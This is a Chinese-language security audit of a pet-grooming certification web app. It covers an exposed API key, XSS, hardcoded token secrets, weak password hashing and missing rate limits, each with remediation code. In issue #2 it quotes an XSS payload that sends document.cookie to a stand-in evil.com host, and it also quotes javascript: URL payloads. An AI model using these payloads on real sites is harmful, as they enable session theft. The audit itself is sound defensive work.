# Davis Taiwan WebApp — 完整安全審計報告
**審計日期**：2026-02-25  
**版本**：davis-taiwan-v3-ai  
**審計範圍**：所有 Netlify Functions、前台 HTML/JS、設定檔、資料庫 Schema

---

## 總覽評分

| 面向 | 評分 | 說明 |
|------|------|------|
| 認證授權 | ⚠️ 中 | 結構正確但有關鍵弱點 |
| 輸入驗證 | 🔴 低 | 多處缺乏驗證和長度限制 |
| XSS 防護 | 🔴 低 | 使用者資料直接注入 innerHTML |
| API 安全 | 🔴 低 | API Key 暴露前台、無速率限制 |
| 資料保護 | ⚠️ 中 | 部分 PII 處理不當 |
| 商務邏輯 | ⚠️ 中 | 有幾個可被濫用的漏洞 |
| 基礎設施 | ⚠️ 中 | CSP 不完整、快取設定有問題 |

---

## 🔴 嚴重問題（立即修復）

### 1. ANTHROPIC_API_KEY 直接暴露給瀏覽器
**位置**：`davis-config.js` → 前台 `window.__DAVIS_KEY__`

`davis-config.js` 把 `ANTHROPIC_API_KEY` 放進公開 API 回應的 `k` 欄位，前台讀取後存入 `window.__DAVIS_KEY__`，然後從瀏覽器直接呼叫 `api.anthropic.com`。

任何人打開 DevTools → Network 就能看到你的 API Key，然後用它無限呼叫 Claude API，費用由你承擔。

**修復方式**：前台完全不應該拿到 API Key。分析功能應該全部走後端 `/api/analyze`（已有這個 function），把 `callAPI()` 改為呼叫後端，`davis-config.js` 移除 `k: apiKey` 欄位。

---

### 2. XSS 漏洞 — 認證資料未經消毒注入 innerHTML
**位置**：`verify.html` 第 104-109 行、`badge.html` 第 80 行

```js
// 直接把資料庫資料注入 HTML — 危險
document.getElementById('card').innerHTML = `
  <div>${c.shop_name}</div>   // ← 未消毒
  <div>${c.ig_url}</div>      // ← 未消毒，且是超連結
`;
```

攻擊者申請認證時在 `shop_name` 填入：
```
<img src=x onerror="fetch('https://evil.com?c='+document.cookie)">
```
審核通過後，任何掃 QR code 的人都會被執行惡意腳本。`ig_url` 和 `fb_url` 更危險，可以填 `javascript:alert(1)`。

**修復方式**：
```js
function esc(s) {
  return String(s||'')
    .replace(/&/g,'&amp;')
    .replace(/</g,'&lt;')
    .replace(/>/g,'&gt;')
    .replace(/"/g,'&quot;')
    .replace(/'/g,'&#039;');
}
function safeUrl(u) {
  if (!u) return '';
  const s = u.trim().toLowerCase();
  return (s.startsWith('https://') || s.startsWith('http://')) ? u : '';
}
// 使用時：
`<div>${esc(c.shop_name)}</div>`
`<a href="${safeUrl(c.ig_url)}">IG</a>`
```

---

### 3. Token 密鑰硬編碼在程式碼裡
**位置**：`admin.js`、`ai-assist.js`、`certify.js`

```js
// 三個檔案都有這行
crypto.createHash("sha256").update(username + ":" + role + ":davis_token_secret")
```

`davis_token_secret` 是硬編碼字串，任何能看到這包 code 的人（包含 GitHub、協作開發者）都能自行偽造合法 token，不需要知道密碼就能登入後台。

**修復方式**：改用環境變數：
```js
const TOKEN_SECRET = process.env.DAVIS_TOKEN_SECRET || "davis_token_secret";
// Netlify 環境變數加上 DAVIS_TOKEN_SECRET=<隨機64字元>
```

---

### 4. 無速率限制 — 分析 API 可被無限濫用
**位置**：`analyze.js`、`ai-assist.js`、`share.js`、`certify.js`

所有公開端點完全沒有速率限制。攻擊者可以：
- 對 `/api/analyze` 發送數千張圖片，耗盡你的 Anthropic API 額度
- 對 `/api/certify` 發垃圾申請，塞滿資料庫
- 對 `/api/share` 大量儲存資料

**修復方式（最快）**：在 Netlify 後台啟用 Rate Limiting（付費功能），或在 function 裡用 IP 計數：
```js
// 用 Supabase 或 KV 記錄每個 IP 的呼叫次數
// 免費替代方案：在 analyze 加上 Cloudflare Turnstile
```

---

## 🟠 高風險問題（本週修復）

### 5. 密碼使用 SHA-256 而非 bcrypt
**位置**：`admin.js` `hashPw()` 函式

```js
function hashPw(pw) {
  return crypto.createHash("sha256").update("davis_salt_" + pw).digest("hex");
}
```

SHA-256 速度極快，攻擊者一秒可以跑數十億次暴力破解。`davis_salt_` 是靜態鹽值（所有帳號共用），等於沒有加鹽。如果資料庫洩漏，密碼幾小時內就能被破解。

**修復方式**：改用 `bcrypt`（Node.js 可裝 `bcryptjs`）或至少用 `crypto.scrypt()`：
```js
const { scryptSync, randomBytes, timingSafeEqual } = require('crypto');
function hashPw(pw) {
  const salt = randomBytes(16).toString('hex');
  const hash = scryptSync(pw, salt, 64).toString('hex');
  return `${salt}:${hash}`;
}
function checkPw(pw, stored) {
  const [salt, hash] = stored.split(':');
  const check = scryptSync(pw, salt, 64);
  return timingSafeEqual(Buffer.from(hash,'hex'), check);
}
```

---

### 6. Token 永不過期
**位置**：`admin.js` makeToken / verifyToken

產生的 token 是靜態的，沒有 `exp`（expiration）欄位。一旦 token 洩漏（如截圖、logs），永遠有效，無法失效。

**修復方式**：加入過期時間：
```js
function makeToken(username, role) {
  const exp = Date.now() + 7 * 24 * 60 * 60 * 1000; // 7天
  const sig = crypto.createHash("sha256")
    .update(username + ":" + role + ":" + exp + ":" + TOKEN_SECRET)
    .digest("hex").slice(0, 16);
  return Buffer.from(JSON.stringify({ username, role, exp, sig })).toString("base64");
}
function verifyToken(authHeader) {
  // ... 驗證後加：
  if (payload.exp && Date.now() > payload.exp) return null;
}
```

---

### 7. 密碼比對有計時攻擊風險
**位置**：`admin.js` 第 73 行

```js
if (user && user.password_hash === hashPw(password)) { // ← 字串比對
```

JavaScript 的 `===` 在找到第一個不同字元就停止，攻擊者可透過測量回應時間推測密碼。

**修復方式**：
```js
if (user && timingSafeEqual(
  Buffer.from(user.password_hash),
  Buffer.from(hashPw(password))
)) { ... }
```

---

### 8. 管理員可建立另一個管理員帳號
**位置**：`admin.js` `/users` POST

```js
const { username, password, role, display_name } = body;
// 沒有限制 role 只能是 'viewer'
const r = await supaReq("POST", "/davis_users", {
  role: role || "viewer",  // ← 呼叫者可以傳 role:"admin"
  ...
```

有後台存取的人可以建立更多管理員帳號。

**修復方式**：
```js
const allowedRoles = ['viewer', 'editor'];
const safeRole = allowedRoles.includes(role) ? role : 'viewer';
```

---

### 9. certify PATCH 沒有欄位白名單
**位置**：`certify.js` 第 158-160 行

```js
if (body.status) updates.status = body.status;     // 沒有白名單
if (body.badge_level) updates.badge_level = body.badge_level; // 任意值
```

管理員可以把 status 設成任意字串（例如 `"hacked"`），badge_level 也可以設成任意值。

**修復方式**：
```js
const VALID_STATUS = ['pending', 'approved', 'rejected', 'suspended'];
const VALID_LEVELS = ['certified', 'advanced', 'master'];
if (body.status && VALID_STATUS.includes(body.status)) updates.status = body.status;
if (body.badge_level && VALID_LEVELS.includes(body.badge_level)) updates.badge_level = body.badge_level;
```

---

## 🟡 中風險問題（本月修復）

### 10. davis-config.js 快取含 API Key 的回應
**位置**：`davis-config.js` 第 20 行

```js
"Cache-Control": "public, max-age=60"
```

`Cache-Control: public` 讓 CDN 和 Proxy 快取這個含有 API Key 的回應。雖然 key 不應該放在這裡（見問題 #1），但修完 #1 後這個快取設定仍然不對——products 和 breeds 資料應該快取，但用 `public` 允許 CDN 快取包含 service key 資訊的回應有風險。

**修復方式**：移除 API Key 後，改為 `Cache-Control: public, max-age=300`（5 分鐘）。

---

### 11. 認證申請無防垃圾機制
**位置**：`certify.js` POST 公開端點

任何人可以無限提交申請，`shop_name` 和 `owner_name` 沒有長度限制，可以填入 10MB 字串。資料庫會被塞滿，後台管理介面會崩潰。

**修復方式**：
```js
if (shop_name.length > 50) return json(400, {error: '店名過長'});
if (owner_name.length > 20) return json(400, {error: '姓名過長'});
if (note && note.length > 500) return json(400, {error: '說明過長'});
// 加上 honeypot 欄位反垃圾
```

---

### 12. share.js 的 result_json 沒有大小限制
**位置**：`share.js` POST

```js
const { result, breed, tier, source, hotel } = body;
if (!result) return json(400, { error: "Missing result" }); // 只確認存在
```

攻擊者可以存入數 MB 的 JSON，`result_json` 欄位（JSONB）理論上可以儲存任意大小資料，會快速吃光資料庫空間。

**修復方式**：
```js
const resultStr = JSON.stringify(result);
if (resultStr.length > 50000) return json(413, {error: '資料過大'});
```

---

### 13. ai-assist.js 文字輸入沒有上限
**位置**：`ai-assist.js` 第 118 行

只驗證「最少 10 字」，沒有上限。攻擊者可以貼入 1MB 文字，不僅耗費大量 token，也可能超出 Anthropic API 的 context window 造成錯誤。

**修復方式**：
```js
if (text.length > 20000) return json(400, {error: '文字過長，請分段輸入（上限 20,000 字）'});
```

---

### 14. CSP 設定不完整
**位置**：`netlify.toml`、`_headers`

```
Content-Security-Policy: frame-ancestors 'self' https://wonderpet.netlify.app
```

目前 CSP 只設了 `frame-ancestors`（防止被嵌入到其他網站），完全沒有限制 `script-src`、`connect-src`、`img-src`。等於沒有保護 XSS 的 CSP。

**修復方式**：
```
Content-Security-Policy: 
  default-src 'self';
  script-src 'self' 'unsafe-inline' https://unpkg.com;
  connect-src 'self' https://api.anthropic.com https://*.supabase.co;
  img-src 'self' data: blob:;
  frame-ancestors 'self' https://wonderpet.netlify.app;
```

---

### 15. verify.html 的 ig_url/fb_url 未驗證協議
**位置**：`verify.html` 第 92-94 行

```js
if (c.ig_url) socials += `<a href="${c.ig_url}" target="_blank">IG</a>`;
```

如果有人申請時填入 `javascript:alert(document.cookie)` 作為 ig_url，後台審核通過後這個連結就會出現在驗證頁上，點擊會執行惡意腳本。

**修復方式**：（與問題 #2 的 `safeUrl()` 函式相同）

---

### 16. certify list 返回完整 phone 欄位給後台
**位置**：`certify.js` `/list` 端點

公開查詢（GET `/api/certify?id=xxx`）有正確隱藏 `phone` 和 `note`，但後台 `/list` 是 `select=*`，電話號碼完整回傳。

目前這只有 admin 能存取，問題不嚴重，但如果未來有 viewer 角色能看列表，phone 就會洩漏。

**修復方式**：明確指定欄位 `select=id,shop_name,owner_name,city,status,badge_level,ig_url,fb_url,line_id,created_at,approved_at,expires_at,view_count`，phone 和 note 只在詳細查詢才回傳。

---

## 🔵 商務邏輯問題

### 17. 認證可以被繞過：POST 時直接注入 status
**位置**：`certify.js` POST 公開端點

雖然程式碼把 `status` 硬寫成 `"pending"`，但如果未來修改時不小心改成直接使用 body 的值，攻擊者就可以自行設定 `status: "approved"`。這是架構上的問題，需要靠程式碼確保，不是靠資料庫約束。

**建議**：在 Supabase 加 CHECK constraint：
```sql
ALTER TABLE davis_certifications 
ADD CONSTRAINT valid_status CHECK (status IN ('pending','approved','rejected','suspended'));
```

---

### 18. 認證到期後 badge 仍然顯示
**位置**：`badge.html`

```js
if (d.cert.status !== 'approved') throw new Error('無效');
if (d.cert.expires_at && new Date(d.cert.expires_at) < new Date()) throw new Error('已過期');
```

邏輯正確，但這個檢查只在瀏覽器做，後端 `/api/certify?id=xxx` 不管過期與否都會回傳資料。嚴格來說後端應該也要過濾。

**建議**：後端加過期檢查，或定期在 Supabase 執行：
```sql
UPDATE davis_certifications SET status='expired' WHERE expires_at < NOW() AND status='approved';
```

---

### 19. 兩套分析流程產品庫不同步
**位置**：`index.html` `callAPI()` vs `analyze.js`

前台 `callAPI()` 裡有一個完整的產品庫（直接呼叫 API），`analyze.js` 裡有另一個版本，兩者內容有差異（`analyze.js` 少了幾個產品）。

這會導致前後台看到的推薦結果邏輯不一致，長期維護會越來越難同步。

**建議**：產品庫和 system prompt 應該只維護一份，存在 `davis-config` 的 settings 裡，兩個分析路徑都從同一來源讀取。

---

### 20. /api/admin/seed 端點在生產環境仍然存在
**位置**：`admin.js` 第 212 行

`/seed` 端點允許管理員大量寫入 products 和 breeds，原本是開發時用的初始化工具，在生產環境沒有理由保留。有此權限的帳號被攻陷後，攻擊者可以用它快速覆蓋整個產品資料庫。

**建議**：部署前移除此端點，或加上額外的確認機制（例如需要環境變數 `SEED_ENABLED=true`）。

---

### 21. 前台 AI 分析費用無上限控制
**位置**：`index.html` `callAPI()`

前台直接呼叫 Anthropic API，沒有每日用量上限、沒有防止同一用戶重複呼叫的機制。如果 APP 病毒式傳播成功（這是目標），單日費用可能暴增。

**建議**：
1. 先移到後端（解決問題 #1）
2. 後端加 IP 每小時最多 10 次限制
3. 在 Anthropic 帳號設定每月花費上限

---

### 22. 認證標章可被任意網站嵌入
**位置**：`badge.html`、`netlify.toml`

`badge.html` 設計為 iframe 嵌入，但 CSP 的 `frame-ancestors` 設定是全站的：
```
frame-ancestors 'self' https://wonderpet.netlify.app
```

這會讓 `badge.html` 本身也被這個規則限制，導致美容店無法把標章嵌入到自己的網站。

**修復方式**：`badge.html` 需要獨立的 header，允許任何網站嵌入：
```toml
[[headers]]
  for = "/badge/*"
  [headers.values]
    Content-Security-Policy = "frame-ancestors *"
```

---

## 修復優先順序

| 優先 | 問題 | 難度 | 影響 |
|------|------|------|------|
| 🔴 今天 | #1 API Key 暴露前台 | 中 | 財務損失 |
| 🔴 今天 | #2、#15 XSS 注入 | 低 | 用戶被攻擊 |
| 🔴 今天 | #3 硬編碼密鑰 | 低 | 後台被入侵 |
| 🔴 今天 | #4 無速率限制 | 中 | API 費用爆增 |
| 🟠 本週 | #5 密碼雜湊弱 | 中 | 帳號洩漏 |
| 🟠 本週 | #6、#7 Token 問題 | 低 | 長期安全 |
| 🟠 本週 | #8 管理員可建管理員 | 低 | 權限失控 |
| 🟠 本週 | #9 欄位無白名單 | 低 | 資料污染 |
| 🟡 本月 | #11、#12、#13 長度限制 | 低 | 垃圾資料 |
| 🟡 本月 | #14 CSP 不完整 | 中 | XSS 防護 |
| 🟡 本月 | #19 雙份 prompt 不同步 | 中 | 商務邏輯 |
| 🟡 本月 | #22 badge iframe 被擋 | 低 | 功能失效 |
| 🔵 下季 | #17、#18 認證邏輯 | 低 | 資料品質 |
| 🔵 下季 | #20 seed 端點 | 低 | 安全清理 |
| 🔵 下季 | #21 費用上限 | 高 | 財務規劃 |
